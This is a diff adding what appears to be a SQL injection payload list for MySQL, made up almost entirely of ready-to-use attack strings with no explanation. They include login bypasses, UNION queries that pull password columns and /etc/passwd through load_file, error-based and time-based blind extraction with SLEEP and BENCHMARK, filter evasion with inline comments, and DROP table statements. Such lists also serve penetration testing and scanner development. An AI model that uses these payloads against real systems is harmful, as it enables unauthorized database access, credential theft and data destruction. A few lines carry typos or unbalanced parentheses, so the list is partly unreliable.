@@ -1,0 +1,164 @@
+select * from user_pwd where name='1' and EXP(~(SELECT*FROM(SELECT USER())a));
+' or 1=1#
+'=0#
+'>-1#
+'<1#
+1'<99#
+'=0=1#
+'<=>0#
+'=0=1=1=1=1=1#
+'=1<>1#
+'<>1#
+1'<>99999#
+'!=2!=3!=4#
+'|0#
+'&0#
+'^0#
+'<<0#
+'>>0#
+'&''#
+'%11&1#
+'&1&1#
+'|0&1#
+'<<0|0#
+'<<0>>0#
+'*9#
+'/9#
+'%9#
+'+0#
+'-0#
+'+2+5-7#
+'+0+0-0#
+'-0-0-0-0-0#
+'*9*8*7*6*5#
+'/2/3/4#
+'%12%34%56%78#
+'/**/+/**/0#
+'-----0#
+'+++0+++++0*0#
+'<hex(1)#
+'=left(0x30,1)#
+'=right(0,1)#
+'!=curdate()#
+'-reverse(0)#
+'=ltrim(0)#
+'<abs(1)#
+'*round(1,1)#
+'&left(0,0)#
+'*round(0,1)*round(0,1)#
+'=upper     (0)#
+' <1 and 1#
+'xor 1#
+'div 1#
+'is not null#
+admin' order by'
+admin' group by'
+'like 0#
+'between 1 and 1#
+'regexp 1#
+'='
+'<>'1
+'>1='
+'>1='
+0'='0
+0'='0
+'<1 and 1>'
+'<1 and 1>'
+'<>ifnull(1,2)='1
+'<>ifnull(1,2)='1
+'=round(0,1)='1
+'=round(0,1)='1
+'*0*'
+'*0*'
+'+'
+'+'
+'-'
+'-'
+'+1-1-'
+'+1-1-'
+'+(0-0)#
+'=0<>((reverse(1))-(reverse(1)))#
+'<(8*7)*(6*5)*(4*3)#
+'&(1+1)-2#
+'>(0-100)#
+'union select 1,load_file(0x2f6574632f706173737764),3 from users#
+'union select 1,group_concat(password),3 from users#
+admin' and (select count(*) from users)=3#
+?num=1 and 1=0
+?num=1 and 1=1
+?num=1=0
+?num=1=1
+?num=1<>0
+?num=1<>1
+?num=1<0
+?num=1<1
+?num=1*0*0*1
+?num=1*0*0*0
+?num=1%1%1%0
+?num=1%1%1%1
+?num=1 div 0
+?num=1 div 1
+?num=1 regexp 0
+?num=1 regexp 1
+?num=1^0
+?num=1^1
+?num=0^(locate(0x61,(select id from users where num=1),1)=1)
+?num=0^(select position(0x61 in (select id from users where num=1))=1)
+?num=0^(reverse(reverse((select id from users where num=1)))=0x61646d696e)
+?num=0^(lcase((select id from users where num=1))=0x61646d696e)
+?num=0^((select id from users where num=1)=0x61646d696e)
+?num=0^(id regexp 0x61646d696e)
+SELECT /*COMMENT*/ 1
+SELECT user()
+SELECT system_user()
+SELECT user FROM mysql.user
+SELECT host, user, password FROM mysql.user
+SELECT schema_name FROM information_schema.schemata; (MySQL >= 5.0)
+SELECT distinct(db) FROM mysql.db (need priv)
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+SLEEP(5)-- 
+SELECT BENCHMARK(1000000,MD5('A'));
+id=1 OR SLEEP(25)=0 LIMIT 1-- 
+id=1) OR SLEEP(25)=0 LIMIT 1-- 
+id=1' OR SLEEP(25)=0 LIMIT 1-- 
+id=1') OR SLEEP(25)=0 LIMIT 1-- 
+id=1)) OR SLEEP(25)=0 LIMIT 1-- 
+id=SELECT SLEEP(25)-- 
+?id=4
+?id=5-1
+?id=4 OR 1=1
+?id=-1 OR 17-7=10
+DROP sampletable;--
+DROP sampletable;#
+admin' or '1'='1'-- 
+DROP/**/sampletable;
+DR/**/OP/**/sampletable;
+SELECT IF(1=1, 1, 2)
+SELECT IF(user()='root@localhost','true','false')
+SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+SELECT * FROM 'user' WHERE 1 LIMIT 0,30
+SELECT * FROM mysql.user WHERE 1 LIMIT 1,1
+SELECT * FROM mysql.user
+SELECT user, password FROM mysql.user
+SELECT user, password FROM mysql.user LIMIT 1,1
+SELECT password FROM mysql.user WHERE user = 'root'
+SELECT schema_name FROM information_schema.schemata;
+SELECT schema_name FROM information_schema.schemata LIMIT 1,1;
+SELECT Super_priv FROM mysql.user WHERE user=(SELECT user) LIMIT 1,1--
+SELECT Super_priv FROM mysql.user WHERE user= ‘root’ LIMIT 1,1--
+SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers’
+tblUsers -> tablename
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';
+find table which have a column called 'username'
+?vulnerableParam=-99 OR IF((ASCII(MID(({INJECTON}),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1--
+id=1/*!uNIon*/SeLeCt+1,2,3--
+id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+1 || (select user from users where user_id = 1) = 'admin'
+1 || substr(user,1,1) = lower(conv(11,10,36))
+1 || substr(user,1,1) = unhex(61)
+1 || substr(user,1,1) = lower(conv(10,10,36
+1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+l=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1)) > 97, BENCHMARK(5000000,SHA1(1)),1))))),1);
